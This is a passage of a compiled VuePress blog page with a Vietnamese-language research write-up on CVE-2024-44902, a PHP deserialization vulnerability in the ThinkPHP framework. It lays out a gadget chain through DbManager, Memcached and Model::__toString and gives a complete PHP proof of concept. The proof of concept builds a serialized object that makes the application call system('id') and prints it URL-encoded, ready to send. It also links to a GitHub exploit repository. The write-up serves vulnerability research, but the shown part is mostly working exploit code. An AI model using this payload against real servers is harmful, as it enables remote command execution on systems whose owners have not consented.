<code>DbManager::createConnection($name)</code> -&gt; <code>Memcached::__construct()</code> -&gt; <code>Models::__toString()</code> -&gt; <code>Models::toJson()</code> -&gt; <code>Models::toArray()</code> -&gt; <code>Models::getAttr($key)</code> -&gt; <code>Models::getValue($name, $value, $relation)</code> -&gt; <code>Models::getJsonValue($fieldName, $value)</code></p><ul><li>Có thể trigger một function nguy hiểm khi so sánh object với string (<code>__toString()</code>)</li><li>Có thể mở rộng code để tìm kiếm khi gọi đến một function không được định nghĩa (<code>__call()</code>)</li></ul><details class="custom-container details"><summary class="custom-container-title">Code</summary><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\\</span>model</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\\</span>Model</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span></span>\n<span class="line">        <span class="token string double-quoted-string">&quot;dox&quot;</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;id&quot;</span><span class="token punctuation">]</span></span>\n<span class="line">    <span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;dox&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">protected</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span></span>\n<span class="line">        <span class="token string double-quoted-string">&quot;dox&quot;</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;system&quot;</span><span class="token punctuation">]</span></span>\n<span class="line">    <span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\\</span>model<span class="token punctuation">\\</span>Pivot</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">class</span> <span class="token class-name-definition class-name">DbManager</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;default&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;domdom&quot;</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;connections&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span></span>\n<span class="line">                <span class="token string double-quoted-string">&quot;domdom&quot;</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span></span>\n<span class="line">                    <span class="token string double-quoted-string">&quot;type&quot;</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">&quot;\\\\think\\\\cache\\\\driver\\\\Memcached&quot;</span><span class="token punctuation">,</span></span>\n<span class="line">                    <span class="token string double-quoted-string">&quot;username&quot;</span> <span class="token operator">=&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>\n<span class="line">                    <span class="token punctuation">]</span></span>\n<span class="line">                <span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">            <span class="token punctuation">}</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">        </span>\n<span class="line"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\\</span>route</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\\</span>DbManager</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">class</span> <span class="token class-name-definition class-name">ResourceRegister</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">protected</span> <span class="token variable">$registered</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">protected</span> <span class="token variable">$resource</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">registered</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">resource</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DbManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line"></span>\n<span class="line"><span class="token variable">$rr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRegister</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$rr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="" tabindex="-1"><a class="header-anchor" href="#"><span></span></a></h2>', 31)),
    createBaseVNode("ul", null, [
      createBaseVNode("li", null, [
        createBaseVNode("a", _hoisted_2, [
          _cache[1] || (_cache[1] = createTextVNode("https://github.com/fru1ts/CVE-2024-44902")),
          createVNode(_component_ExternalLinkIcon)
        ])
      ])
    ])
  ]);
}
const CVE202444902_html = /* @__PURE__ */ _export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "CVE-2024-44902.html.vue"]]);
const data = JSON.parse('{"path":"/blogs/CTF/2024/CVE-2024-44902.html","title":"CVE-2024-44902","lang":"en-US","frontmatter":{"title":"CVE-2024-44902","date":"2024-09-20T00:00:00.000Z","tags":["Deserialization"],"categories":["Research"]},"headers":[{"level":2,"title":"Overview","slug":"overview","link":"#overview","children":[]},{"level":2,"title":"PHP Deserialize","slug":"php-deserialize","link":"#php-deserialize","children":[{"level":3,"title":"Tổng hợp lại gadget chain","slug":"tong-hop-lai-gadget-chain","link":"#tong-hop-lai-gadget-chain","children":[]}]},{"level":2,"title":"","slug":"","link":"#","children":[]}],"git":{"createdTime":1734340044000,"updatedTime":1734340044000,"contributors":[{"name":"Phan Nguyen Huy Duy","email":"pnhd.dyh@gmail.com","commits":1}]},"filePathRelative":"blogs/CTF/2024/CVE-2024-44902.md"}');
export {
  CVE202444902_html as comp,
  data
};
